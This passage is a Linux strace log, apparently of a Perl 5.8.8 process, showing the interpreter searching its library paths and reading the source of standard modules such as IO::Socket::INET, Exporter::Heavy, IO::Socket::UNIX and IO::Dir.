my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
12318 07:41:50.121921 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.121952 stat64("/etc/perl/Exporter/Heavy.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.121966 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.121979 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.121993 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.122006 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.122020 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.122032 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.122046 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.122058 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.122071 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.122084 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.122098 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.122111 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
12318 07:41:50.122132 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
12318 07:41:50.122147 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff54d18) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.122158 _llseek(8, 0, [0], SEEK_CUR) = 0
12318 07:41:50.122175 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
12318 07:41:50.122996 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
12318 07:41:50.123208 brk(0x829c000)    = 0x829c000
12318 07:41:50.123465 read(8, "", 4096) = 0
12318 07:41:50.123481 close(8)          = 0
12318 07:41:50.124622 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
12318 07:41:50.125064 _llseek(6, 6496, [6496], SEEK_SET) = 0
12318 07:41:50.125081 _llseek(6, 0, [6496], SEEK_CUR) = 0
12318 07:41:50.125091 close(6)          = 0
12318 07:41:50.125150 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.125166 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.125180 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.125193 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.125207 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.125220 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.125234 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.125246 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.125260 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.125272 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.125285 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.125298 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
12318 07:41:50.125320 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
12318 07:41:50.125335 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff551c8) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.125346 _llseek(6, 0, [0], SEEK_CUR) = 0
12318 07:41:50.125468 brk(0x82bd000)    = 0x82bd000
12318 07:41:50.125518 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
12318 07:41:50.126128 _llseek(6, 1386, [1386], SEEK_SET) = 0
12318 07:41:50.126146 _llseek(6, 0, [1386], SEEK_CUR) = 0
12318 07:41:50.126156 close(6)          = 0
12318 07:41:50.126210 stat64("/etc/perl/IO/Dir.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.126226 stat64("/etc/perl/IO/Dir.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.126239 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.126252 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.126268 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.126280 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.126294 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.126306 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.126340 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.126352 stat64("/usr/share/perl5/IO/Dir.pm", 0xbff553bc) = -1 ENOENT (No such file or directory)
12318 07:41:50.126381 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbff554ac) = -1 ENOENT (No such file or directory)
12318 07:41:50.126394 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
12318 07:41:50.126415 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
12318 07:41:50.126429 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff551c8) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.126440 _llseek(6, 0, [0], SEEK_CUR) = 0
12318 07:41:50.126490 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
12318 07:41:50.126990 stat64("/etc/perl/Tie/Hash.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.127009 stat64("/etc/perl/Tie/Hash.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.127024 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.127037 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.127051 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.127064 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.127079 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.127091 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.127104 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.127117 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.127130 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.127143 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbff54f0c) = -1 ENOENT (No such file or directory)
12318 07:41:50.127157 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbff54ffc) = -1 ENOENT (No such file or directory)
12318 07:41:50.127170 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
12318 07:41:50.127197 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
12318 07:41:50.127212 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbff54d18) = -1 ENOTTY (Inappropriate ioctl for device)
12318 07:41:50.127224 _llseek(8, 0, [0], SEEK_CUR) = 0
